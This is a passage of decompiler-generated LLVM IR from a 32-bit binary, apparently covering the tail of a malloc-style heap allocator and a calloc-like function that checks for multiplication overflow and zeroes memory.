  %v2_8053b86 = sub i32 %v0_8053b86, %v1_8053b86
  store i32 %v2_8053b86, i32* @edx, align 4
  store i32 %v1_8053b86, i32* @global_var_80575ac.207, align 4
  %v1_8053b8e = load i32, i32* @esi, align 4
  %v2_8053b8e = add i32 %v1_8053b8e, %v2_8053b86
  %v1_8053b91 = or i32 %v2_8053b8e, 1
  store i32 %v1_8053b91, i32* %eax.global-to-local, align 4
  %v2_8053b94 = add i32 %v1_8053b86, 4
  %v3_8053b94 = inttoptr i32 %v2_8053b94 to i32*
  store i32 %v1_8053b91, i32* %v3_8053b94, align 4
  %v0_8053b97 = load i32, i32* @global_var_80578e8.219, align 8
  %v1_8053b97 = load i32, i32* @esi, align 4
  %v2_8053b97 = add i32 %v1_8053b97, %v0_8053b97
  store i32 %v2_8053b97, i32* @global_var_80578e8.219, align 8
  br i1 %v2_80539fe, label %dec_label_pc_8053bef, label %dec_label_pc_8053ba1

dec_label_pc_8053ba1:                             ; preds = %dec_label_pc_8053b86
  %v1_8053ba1 = add i32 %v1_80539fe, -12
  store i32 %v0_80539eb, i32* %ecx.global-to-local, align 4
  %v1_8053ba8 = and i32 %v1_8053ba1, -8
  store i32 %v1_8053ba8, i32* %eax.global-to-local, align 4
  %v1_8053bad = or i32 %v1_8053ba8, 1
  store i32 %v1_8053bad, i32* @edx, align 4
  %v5_8053bb0 = icmp ult i32 %v1_8053ba8, 15
  store i32 %v1_8053bad, i32* %v2_80539f4, align 4
  %v0_8053bb6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053bb6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053bb6 = add i32 %v0_8053bb6, 4
  %v3_8053bb6 = add i32 %v2_8053bb6, %v1_8053bb6
  %v4_8053bb6 = inttoptr i32 %v3_8053bb6 to i32*
  store i32 5, i32* %v4_8053bb6, align 4
  %v0_8053bbe = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053bbe = load i32, i32* %eax.global-to-local, align 4
  %v2_8053bbe = add i32 %v0_8053bbe, 8
  %v3_8053bbe = add i32 %v2_8053bbe, %v1_8053bbe
  %v4_8053bbe = inttoptr i32 %v3_8053bbe to i32*
  store i32 5, i32* %v4_8053bbe, align 4
  br i1 %v5_8053bb0, label %dec_label_pc_8053bef, label %dec_label_pc_8053bc8

dec_label_pc_8053bc8:                             ; preds = %dec_label_pc_8053ba1
  %v0_8053bcb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053bcd = add i32 %v0_8053bcb, 8
  store i32 %v1_8053bcd, i32* %eax.global-to-local, align 4
  %v0_8053bd0 = load i32, i32* @global_var_80578c4.223, align 4
  store i32 %v0_8053bd0, i32* @ebx, align 4
  store i32 %v1_8053bcd, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_80578c4.223, align 4
  %v1_8053be1 = call i32 @function_8054319(i32 %v1_8053bcd)
  store i32 %v1_8053be1, i32* %eax.global-to-local, align 4
  %v0_8053be6 = load i32, i32* @ebx, align 4
  store i32 %v0_8053be6, i32* @global_var_80578c4.223, align 4
  br label %dec_label_pc_8053bef

dec_label_pc_8053bef:                             ; preds = %dec_label_pc_8053ba1, %dec_label_pc_8053b86, %dec_label_pc_8053b81, %dec_label_pc_8053ab0, %dec_label_pc_8053bc8
  %v0_8053bef = load i32, i32* @global_var_80578e8.219, align 8
  store i32 %v0_8053bef, i32* %eax.global-to-local, align 4
  %v1_8053bf4 = load i32, i32* @global_var_80578ec.224, align 4
  %tmp133 = icmp ugt i32 %v0_8053bef, %v1_8053bf4
  br i1 %tmp133, label %dec_label_pc_8053bfc, label %dec_label_pc_8053c01

dec_label_pc_8053bfc:                             ; preds = %dec_label_pc_8053bef
  store i32 %v0_8053bef, i32* @global_var_80578ec.224, align 4
  br label %dec_label_pc_8053c01

dec_label_pc_8053c01:                             ; preds = %dec_label_pc_8053bef, %dec_label_pc_8053bfc
  %v1_8053c01 = load i32, i32* @global_var_80578e4.217, align 4
  %v2_8053c01 = add i32 %v1_8053c01, %v0_8053bef
  store i32 %v2_8053c01, i32* %eax.global-to-local, align 4
  %v1_8053c07 = load i32, i32* @global_var_80578f4.220, align 4
  %tmp134 = icmp ugt i32 %v2_8053c01, %v1_8053c07
  br i1 %tmp134, label %dec_label_pc_8053c0f, label %dec_label_pc_8053c14

dec_label_pc_8053c0f:                             ; preds = %dec_label_pc_8053c01
  store i32 %v2_8053c01, i32* @global_var_80578f4.220, align 4
  br label %dec_label_pc_8053c14

dec_label_pc_8053c14:                             ; preds = %dec_label_pc_8053c01, %dec_label_pc_8053c0f
  %v0_8053c14 = load i32, i32* @global_var_80575ac.207, align 4
  store i32 %v0_8053c14, i32* @ebx, align 4
  %v1_8053c1a = add i32 %v0_8053c14, 4
  %v2_8053c1a = inttoptr i32 %v1_8053c1a to i32*
  %v3_8053c1a = load i32, i32* %v2_8053c1a, align 4
  %v1_8053c1d = and i32 %v3_8053c1a, -4
  store i32 %v1_8053c1d, i32* %ecx.global-to-local, align 4
  %v10_8053c20 = icmp ult i32 %v1_8053c1d, %v1_80538bd
  br i1 %v10_8053c20, label %dec_label_pc_8053ca0, label %dec_label_pc_8053c26

dec_label_pc_8053c26:                             ; preds = %dec_label_pc_8053c14
  store i32 %v1_8053948, i32* %esi.global-to-local, align 4
  %v2_8053c2c = sub i32 %v1_8053c1d, %v1_8053948
  store i32 %v2_8053c2c, i32* %ecx.global-to-local, align 4
  %v2_8053c2e = add i32 %v0_8053c14, %v1_8053948
  store i32 %v2_8053c2e, i32* @edx, align 4
  %v1_8053c31 = or i32 %v1_8053948, 1
  store i32 %v1_8053c31, i32* %eax.global-to-local, align 4
  store i32 %v2_8053c2e, i32* @global_var_80575ac.207, align 4
  store i32 %v1_8053c31, i32* %v2_8053c1a, align 4
  %v0_8053c3d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053c3d

dec_label_pc_8053c3d:                             ; preds = %dec_label_pc_80538ce, %dec_label_pc_8053c26
  %v0_8053c3d = phi i32 [ %v5_80538e1, %dec_label_pc_80538ce ], [ %v0_8053c3d.pre, %dec_label_pc_8053c26 ]
  %v1_8053c3d = or i32 %v0_8053c3d, 1
  store i32 %v1_8053c3d, i32* %ecx.global-to-local, align 4
  %v0_8053c40 = load i32, i32* @ebx, align 4
  %v1_8053c40 = add i32 %v0_8053c40, 8
  store i32 %v1_8053c40, i32* %ebx.global-to-local, align 4
  %v1_8053c43 = load i32, i32* @edx, align 4
  %v2_8053c43 = add i32 %v1_8053c43, 4
  %v3_8053c43 = inttoptr i32 %v2_8053c43 to i32*
  store i32 %v1_8053c3d, i32* %v3_8053c43, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_8053c48:                             ; preds = %dec_label_pc_8053688
  %v5_8053c4e = sub i32 %v1_805366b, %v1_8053948
  store i32 %v5_8053c4e, i32* %eax.global-to-local, align 4
  %v2_8053c52 = add i32 %v1_8053c5f, %v1_8053948
  store i32 %v2_8053c52, i32* @edx, align 4
  %v1_8053c56 = or i32 %v1_8053948, 1
  store i32 %v2_8053c52, i32* @global_var_80575b0.208, align 16
  store i32 %v1_8053c56, i32* %v2_8053665, align 4
  %v0_8053c62 = load i32, i32* %eax.global-to-local, align 4
  %v0_8053c64 = load i32, i32* @edx, align 4
  store i32 %v0_8053c64, i32* @global_var_80575bc.225, align 4
  %v1_8053c6a = or i32 %v0_8053c62, 1
  store i32 %v1_8053c6a, i32* %ecx.global-to-local, align 4
  store i32 %v0_8053c64, i32* @global_var_80575c0.210, align 64
  %v1_8053c73 = add i32 %v0_8053c64, 8
  %v2_8053c73 = inttoptr i32 %v1_8053c73 to i32*
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %v2_8053c73, align 4
  %v0_8053c7a = load i32, i32* @edx, align 4
  %v1_8053c7a = add i32 %v0_8053c7a, 12
  %v2_8053c7a = inttoptr i32 %v1_8053c7a to i32*
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %v2_8053c7a, align 4
  %v0_8053c81 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053c81 = load i32, i32* @edx, align 4
  %v2_8053c81 = add i32 %v1_8053c81, 4
  %v3_8053c81 = inttoptr i32 %v2_8053c81 to i32*
  store i32 %v0_8053c81, i32* %v3_8053c81, align 4
  %v0_8053c84 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053c84 = load i32, i32* @edx, align 4
  %v3_8053c84 = add i32 %v1_8053c84, %v0_8053c84
  %v4_8053c84 = inttoptr i32 %v3_8053c84 to i32*
  store i32 %v0_8053c84, i32* %v4_8053c84, align 4
  br label %dec_label_pc_8053c92

dec_label_pc_8053c89:                             ; preds = %dec_label_pc_8053697
  store i32 %v1_8053948, i32* %ebx.global-to-local, align 4
  %v0_8053c8d = load i32, i32* @ebp, align 4
  %v2_8053c8d = or i32 %v1_8053948, 4
  %v3_8053c8d = add i32 %v0_8053c8d, %v2_8053c8d
  %v4_8053c8d = inttoptr i32 %v3_8053c8d to i32*
  %v5_8053c8d = load i32, i32* %v4_8053c8d, align 4
  %v6_8053c8d = or i32 %v5_8053c8d, 1
  store i32 %v6_8053c8d, i32* %v4_8053c8d, align 4
  br label %dec_label_pc_8053c92

dec_label_pc_8053c92:                             ; preds = %dec_label_pc_8053c48, %dec_label_pc_8053c89
  %v0_8053c92 = load i32, i32* @ebp, align 4
  %v1_8053c92 = add i32 %v0_8053c92, 8
  store i32 %v1_8053c92, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_8053c97:                             ; preds = %dec_label_pc_8053787
  %v1_8053c97 = load i32, i32* @ebx, align 4
  %v2_8053c97 = add i32 %v0_8053796, 4
  %v3_8053c97 = add i32 %v2_8053c97, %v1_8053c97
  %v4_8053c97 = inttoptr i32 %v3_8053c97 to i32*
  %v5_8053c97 = load i32, i32* %v4_8053c97, align 4
  %v6_8053c97 = or i32 %v5_8053c97, 1
  store i32 %v6_8053c97, i32* %v4_8053c97, align 4
  br label %dec_label_pc_8053c9c

dec_label_pc_8053c9c:                             ; preds = %dec_label_pc_805379f, %dec_label_pc_8053c97
  %v0_8053c9c = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8053c9c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_8053ca0:                             ; preds = %dec_label_pc_8053a5e, %dec_label_pc_8053c14, %dec_label_pc_8053a68
  %v0_8053ca0 = load i32, i32* %stack_var_-92, align 4
  %v1_8053ca0 = call i32 @function_80530f9(i32 %v0_8053ca0)
  store i32 %v1_8053ca0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053ca7 = inttoptr i32 %v1_8053ca0 to i32*
  store i32 12, i32* %v1_8053ca7, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_8053cad:                             ; preds = %dec_label_pc_8053c9c, %dec_label_pc_8053c92, %dec_label_pc_8053c3d, %dec_label_pc_80538f9, %dec_label_pc_80538ab, %dec_label_pc_8053632, %dec_label_pc_8053ca0
  store i32 %v2_8053569, i32* @eax, align 4
  store i32 %v2_8053569, i32* %stack_var_-92, align 4
  %v2_8053cb6 = call i32 @function_8054a80(i32 %v2_8053569, i32 1)
  store i32 %v2_8053cb6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053cbe

dec_label_pc_8053cbe:                             ; preds = %dec_label_pc_8053587, %dec_label_pc_8053cad
  %v0_8053cc1 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053cc1, i32* %eax.global-to-local, align 4
  store i32 %v0_8053556, i32* @esi, align 4
  store i32 %v0_8053555, i32* @edi, align 4
  store i32 %v0_8053554, i32* @ebp, align 4
  ret i32 %v0_8053cc1

; uselistorder directives
  uselistorder i32 %v0_8053c84, { 1, 0 }
  uselistorder i32 %v0_8053c64, { 1, 0, 2 }
  uselistorder i32 %v2_8053c01, { 1, 0, 2 }
  uselistorder i32 %v0_8053bef, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053b86, { 1, 0 }
  uselistorder i32 %v2_8053b74, { 1, 0 }
  uselistorder i32 %v1_8053b2b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8053b15, { 1, 0, 2 }
  uselistorder i32 %v2_8053b09, { 1, 2, 0 }
  uselistorder i32 %v2_8053b04, { 1, 0, 2 }
  uselistorder i32 %v1_8053af4, { 2, 1, 0 }
  uselistorder i8 %v0_8053ac2, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8053aa5, { 1, 0, 2 }
  uselistorder i32 %v0_8053b5993, { 2, 0, 1 }
  uselistorder i32 %v0_8053b6794, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8053a9f, { 2, 1, 0 }
  uselistorder i32 %v8_8053a75, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8053a72, { 1, 0 }
  uselistorder i32 %v0_8053a51, { 1, 0 }
  uselistorder i32 %v2_8053a22, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8053a1a, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8053a07, { 1, 0 }
  uselistorder i1 %v2_80539fe, { 2, 1, 0 }
  uselistorder i32 %v1_80539fe, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_80539eb, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_80539cf, { 1, 0, 2 }
  uselistorder i32 %v2_80539bb, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8053984, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8053978, { 2, 1, 0 }
  uselistorder i32 %v8_8053967, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_805394e, { 1, 0, 2 }
  uselistorder i32 %v0_80538ea, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80538bd, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80538b3, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80538a5, { 1, 0 }
  uselistorder i32 %v1_805383c, { 1, 0 }
  uselistorder i32 %v3_8053830, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8053840, { 1, 0 }
  uselistorder i32 %v2_805382a, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80538277, { 1, 0 }
  uselistorder i32 %v2_805381c, { 1, 0 }
  uselistorder i32 %v1_8053800, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80537fc, { 2, 1, 0 }
  uselistorder i32 %v1_80537f8, { 1, 0 }
  uselistorder i32 %v1_80537ec, { 2, 1, 0 }
  uselistorder i32 %v2_80537e2, { 1, 0 }
  uselistorder i32 %v1_80537df, { 1, 2, 0 }
  uselistorder i32 %v4_805377d, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_80537c8, { 1, 0 }
  uselistorder i32 %v0_8053796, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8053769, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8053736, { 0, 2, 1 }
  uselistorder i32 %v2_805371a, { 1, 0 }
  uselistorder i32 %v1_8053710, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_805370b.lcssa, { 1, 0 }
  uselistorder i32 %v3_80536fb, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80536f2, { 1, 0, 2 }
  uselistorder i32 %v2_80536ce, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80536b6, { 2, 1, 0 }
  uselistorder i32 %v0_80536a2, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8053668, { 1, 0, 2 }
  uselistorder i32 %v1_8053c5f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80537369, { 1, 0, 2 }
  uselistorder i32 %v3_8053615, { 1, 0, 2 }
  uselistorder i32 %v2_8053607, { 2, 1, 0 }
  uselistorder i32 %v2_80535e2, { 2, 1, 0 }
  uselistorder i8 %v0_80535b0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_8053948, { 13, 31, 12, 2, 29, 11, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8053599, { 0, 2, 1 }
  uselistorder i32 %v0_8053582, { 1, 0 }
  uselistorder i32 %v2_8053569, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_80578e0.222, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8054d98, { 1, 0 }
  uselistorder i32 134575540, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_80575c0.210, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_805352e, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80575ac.207 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80575ac.207 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053cbe, { 1, 0 }
  uselistorder label %dec_label_pc_8053cad, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053ca0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053c9c, { 1, 0 }
  uselistorder label %dec_label_pc_8053c92, { 1, 0 }
  uselistorder label %dec_label_pc_8053c3d, { 1, 0 }
  uselistorder label %dec_label_pc_8053c14, { 1, 0 }
  uselistorder label %dec_label_pc_8053c01, { 1, 0 }
  uselistorder label %dec_label_pc_8053bef, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053b81, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053b7c, { 1, 0 }
  uselistorder label %dec_label_pc_8053b60, { 1, 0 }
  uselistorder label %dec_label_pc_8053b09, { 1, 0 }
  uselistorder label %dec_label_pc_8053af2, { 1, 0 }
  uselistorder label %dec_label_pc_8053adb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053a5e, { 1, 0 }
  uselistorder label %dec_label_pc_8053a51, { 1, 0 }
  uselistorder label %dec_label_pc_8053a12, { 1, 0 }
  uselistorder label %dec_label_pc_80539eb, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80539cf, { 1, 0 }
  uselistorder label %dec_label_pc_80539b6, { 1, 0 }
  uselistorder label %dec_label_pc_8053998, { 1, 0 }
  uselistorder label %dec_label_pc_80538b3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80538ab, { 1, 0 }
  uselistorder label %dec_label_pc_8053894, { 1, 0 }
  uselistorder label %dec_label_pc_8053827, { 1, 0 }
  uselistorder label %dec_label_pc_805382c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8053800, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053787, { 1, 0 }
  uselistorder label %dec_label_pc_8053736, { 1, 0 }
  uselistorder label %dec_label_pc_805370e, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80536f7, { 1, 0 }
  uselistorder label %dec_label_pc_8053665, { 1, 0 }
  uselistorder label %dec_label_pc_8053736.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053632, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80535b0, { 1, 0 }
}

define i32 @function_8053cc8(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053cc8:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8053cc8 = load i32, i32* @edi, align 4
  %v0_8053cca = load i32, i32* @ebx, align 4
  %v12_8053ccb = ptrtoint i32* %stack_var_-28 to i32
  %v4_8053cce = trunc i64 %arg1 to i32
  store i32 %v4_8053cce, i32* @edx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_8053cd8 = sdiv i64 %sext, 4294967296
  %v3_8053cd8 = sext i32 %arg2 to i64
  %v4_8053cd8 = mul nsw i64 %v3_8053cd8, %v2_8053cd8
  %v5_8053cd8 = trunc i64 %v4_8053cd8 to i32
  store i32 %v5_8053cd8, i32* @ebx, align 4
  %v2_8053cdb = icmp eq i32 %v4_8053cce, 0
  br i1 %v2_8053cdb, label %dec_label_pc_8053cfd, label %dec_label_pc_8053cdf

dec_label_pc_8053cdf:                             ; preds = %dec_label_pc_8053cc8
  store i32 %v4_8053cce, i32* @edi, align 4
  %div = udiv i32 %v5_8053cd8, %v4_8053cce
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp14 = urem i32 %v5_8053cd8, %v4_8053cce
  store i32 %tmp14, i32* @edx, align 4
  %v12_8053ce7 = icmp eq i32 %div, %arg2
  br i1 %v12_8053ce7, label %dec_label_pc_8053cfd, label %dec_label_pc_8053ceb

dec_label_pc_8053ceb:                             ; preds = %dec_label_pc_8053cdf
  %v1_8053ceb = call i32 @function_80530f9(i32 %v0_8053cca)
  store i32 %v1_8053ceb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053cf2 = inttoptr i32 %v1_8053ceb to i32*
  store i32 12, i32* %v1_8053cf2, align 4
  br label %dec_label_pc_8053db3

dec_label_pc_8053cfd:                             ; preds = %dec_label_pc_8053cdf, %dec_label_pc_8053cc8
  store i32 %v12_8053ccb, i32* @eax, align 4
  %v2_8053d0d = call i32 @function_8054a80(i32 %v12_8053ccb, i32 134564477)
  store i32 %v2_8053d0d, i32* %eax.global-to-local, align 4
  %v1_8053d19 = call i32 @function_8054a7d(i32 ptrtoint (i32* @global_var_80571e0.205 to i32))
  store i32 %v1_8053d19, i32* %eax.global-to-local, align 4
  %v0_8053d1e = load i32, i32* @ebx, align 4
  %v1_8053d21 = call i32 @function_8053554(i32 %v0_8053d1e)
  store i32 %v1_8053d21, i32* %eax.global-to-local, align 4
  store i32 %v1_8053d21, i32* %ebx.global-to-local, align 4
  %v1_8053d2b = icmp eq i32 %v1_8053d21, 0
  br i1 %v1_8053d2b, label %dec_label_pc_8053da2, label %dec_label_pc_8053d2f

dec_label_pc_8053d2f:                             ; preds = %dec_label_pc_8053cfd
  %v1_8053d2f = add i32 %v1_8053d21, -4
  %v2_8053d2f = inttoptr i32 %v1_8053d2f to i32*
  %v3_8053d2f = load i32, i32* %v2_8053d2f, align 4
  store i32 %v3_8053d2f, i32* %eax.global-to-local, align 4
  %v2_8053d32 = and i32 %v3_8053d2f, 2
  %v3_8053d32 = icmp eq i32 %v2_8053d32, 0
  %v1_8053d34 = icmp eq i1 %v3_8053d32, false
  br i1 %v1_8053d34, label %dec_label_pc_8053da2, label %dec_label_pc_8053d36

dec_label_pc_8053d36:                             ; preds = %dec_label_pc_8053d2f
  %v1_8053d363 = add i32 %v3_8053d2f, -4
  %v1_8053d39 = and i32 %v1_8053d363, -4
  store i32 %v1_8053d39, i32* @edx, align 4
  %v2_8053d3e = udiv i32 %v1_8053d39, 4
  store i32 %v2_8053d3e, i32* %eax.global-to-local, align 4
  %v5_8053d41 = icmp ult i32 %v1_8053d39, 36
  %tmp = and i32 %v1_8053d363, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8053d44 = or i1 %v5_8053d41, %tmp18
  br i1 %v2_8053d44, label %dec_label_pc_8053d55, label %dec_label_pc_8053d46

dec_label_pc_8053d46:                             ; preds = %dec_label_pc_8053d36
  %v3_8053d4b = inttoptr i32 %v1_8053d21 to i8*
  %v4_8053d4b = call i32 @function_805314a(i8* %v3_8053d4b, i32 0, i32 %v1_8053d39)
  store i32 %v4_8053d4b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053da2

dec_label_pc_8053d55:                             ; preds = %dec_label_pc_8053d36
  %v1_8053d55 = inttoptr i32 %v1_8053d21 to i32*
  store i32 0, i32* %v1_8053d55, align 4
  %v0_8053d5b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d5b = add i32 %v0_8053d5b, 4
  %v2_8053d5b = inttoptr i32 %v1_8053d5b to i32*
  store i32 0, i32* %v2_8053d5b, align 4
  %v0_8053d62 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d62 = add i32 %v0_8053d62, 8
  %v2_8053d62 = inttoptr i32 %v1_8053d62 to i32*
  store i32 0, i32* %v2_8053d62, align 4
  %v0_8053d69 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8053d69, 5
  br i1 %tmp15, label %dec_label_pc_8053da2, label %dec_label_pc_8053d6e

dec_label_pc_8053d6e:                             ; preds = %dec_label_pc_8053d55
  %v0_8053d6e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d6e = add i32 %v0_8053d6e, 12
  %v2_8053d6e = inttoptr i32 %v1_8053d6e to i32*
  store i32 0, i32* %v2_8053d6e, align 4
  %v0_8053d75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d75 = add i32 %v0_8053d75, 16
  %v2_8053d75 = inttoptr i32 %v1_8053d75 to i32*
  store i32 0, i32* %v2_8053d75, align 4
  %v0_8053d7c = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_8053d7c, 7
  br i1 %tmp16, label %dec_label_pc_8053da2, label %dec_label_pc_8053d81

dec_label_pc_8053d81:                             ; preds = %dec_label_pc_8053d6e
  %v0_8053d81 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d81 = add i32 %v0_8053d81, 20
  %v2_8053d81 = inttoptr i32 %v1_8053d81 to i32*
  store i32 0, i32* %v2_8053d81, align 4
  %v0_8053d88 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d88 = add i32 %v0_8053d88, 24
  %v2_8053d88 = inttoptr i32 %v1_8053d88 to i32*
  store i32 0, i32* %v2_8053d88, align 4
  %v0_8053d8f = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8053d8f, 9
  br i1 %tmp17, label %dec_label_pc_8053da2, label %dec_label_pc_8053d94

dec_label_pc_8053d94:                             ; preds = %dec_label_pc_8053d81
  %v0_8053d94 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d94 = add i32 %v0_8053d94, 28
  %v2_8053d94 = inttoptr i32 %v1_8053d94 to i32*
  store i32 0, i32* %v2_8053d94, align 4
  %v0_8053d9b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d9b = add i32 %v0_8053d9b, 32
  %v2_8053d9b = inttoptr i32 %v1_8053d9b to i32*
  store i32 0, i32* %v2_8053d9b, align 4
  br label %dec_label_pc_8053da2

dec_label_pc_8053da2:                             ; preds = %dec_label_pc_8053d81, %dec_label_pc_8053d6e, %dec_label_pc_8053d55, %dec_label_pc_8053d2f, %dec_label_pc_8053cfd, %dec_label_pc_8053d46, %dec_label_pc_8053d94
  store i32 %v12_8053ccb, i32* @eax, align 4
  %v2_8053dab = call i32 @function_8054a80(i32 %v12_8053ccb, i32 1)
  store i32 %v2_8053dab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053db3

dec_label_pc_8053db3:                             ; preds = %dec_label_pc_8053ceb, %dec_label_pc_8053da2
  %v0_8053db6 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053db6, i32* %eax.global-to-local, align 4
  store i32 %v0_8053cca, i32* @ebx, align 4
  store i32 %v0_8053cc8, i32* @edi, align 4
  ret i32 %v0_8053db6

; uselistorder directives
  uselistorder i32 %v1_8053d39, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8053d21, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_8053cd8, { 1, 0, 2 }
  uselistorder i32 %v4_8053cce, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 11, 8, 12 }
  uselistorder i64 4294967296, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_8053db3, { 1, 0 }
  uselistorder label %dec_label_pc_8053da2, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8053dbc() local_unnamed_addr {
dec_label_pc_8053dbc:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
